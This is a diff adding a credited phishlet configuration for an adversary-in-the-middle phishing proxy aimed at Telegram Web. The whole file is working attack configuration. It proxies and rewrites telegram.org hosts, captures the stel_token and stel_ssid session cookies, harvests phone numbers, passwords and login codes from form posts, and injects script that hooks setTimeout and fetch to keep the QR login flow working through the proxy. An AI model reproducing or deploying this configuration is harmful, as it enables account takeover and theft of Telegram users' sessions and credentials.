@@ -1,0 +1,101 @@
+name: 'Telegram Phishlet'
+author: 'KhaninKali'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - { phish_sub: 'web', orig_sub: 'web', domain: 'telegram.org', session: true, is_landing: true }
+  - { phish_sub: 'api', orig_sub: 'api', domain: 'telegram.org', session: false, is_landing: false }
+
+sub_filters: 
+  - { triggers_on: 'web.telegram.org', hostname: '{hostname}', sub: 'web', orig_sub: 'web', domain: 'telegram.org', search: 'web.telegram.org', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { triggers_on: 'web.telegram.org', hostname: '{hostname}', sub: 'web', orig_sub: 'web', domain: 'telegram.org', search: 'api.telegram.org', replace: 'api.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'web.telegram.org', hostname: '{hostname}', sub: 'web', orig_sub: 'web', domain: 'telegram.org', search: 'web.telegram.org', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}
+
+auth_tokens:
+  - domain: 'telegram.org'
+    keys: ['stel_token', 'stel_ssid']
+
+credentials:
+  username:
+    key: 'phone'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  code:
+    key: 'code'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'web.telegram.org'
+  path: '/'
+  url: https://web.telegram.org/
+
+auth_urls:
+  - 'web.telegram.org/auth'
+
+js_inject:
+  - trigger_domains: ['web.telegram.org']
+    trigger_paths: ['/']
+    script: |
+      // Fix QR code generation and authentication flow
+      (function() {
+        // Override QR code generation to prevent stuck state
+        const originalSetTimeout = window.setTimeout;
+        window.setTimeout = function(callback, delay) {
+          if (delay > 10000) { // Prevent excessive delays
+            return originalSetTimeout(callback, 1000);
+          }
+          return originalSetTimeout(callback, delay);
+        };
+        
+        // Handle QR code refresh
+        setInterval(() => {
+          const qrElement = document.querySelector('[class*="qr"], [id*="qr"]');
+          if (qrElement && qrElement.style.display === 'none') {
+            qrElement.style.display = 'block';
+          }
+        }, 2000);
+        
+        // Force QR code regeneration if stuck
+        let qrRetryCount = 0;
+        const maxRetries = 5;
+        
+        function checkQRStatus() {
+          const qrContainer = document.querySelector('[class*="qr-container"], [class*="auth-qr"]');
+          if (qrContainer) {
+            const qrImage = qrContainer.querySelector('img, canvas');
+            if (!qrImage && qrRetryCount < maxRetries) {
+              qrRetryCount++;
+              // Trigger QR code regeneration
+              const event = new Event('click');
+              qrContainer.dispatchEvent(event);
+            }
+          }
+        }
+        
+        // Check QR status periodically
+        setInterval(checkQRStatus, 3000);
+        
+        // Handle authentication redirects
+        const originalFetch = window.fetch;
+        window.fetch = function(url, options) {
+          if (url && url.includes('/auth')) {
+            return originalFetch(url, options).then(response => {
+              // Ensure proper redirect handling
+              if (response.redirected) {
+                window.location.href = response.url;
+              }
+              return response;
+            });
+          }
+          return originalFetch(url, options);
+        };
+      })();
+
+# This is a Telegram phishlet configured for web.telegram.or
+# Upgraded and Made by Khaninkali 
+#  Purely Made  by KhaninKali Hypersecurity 
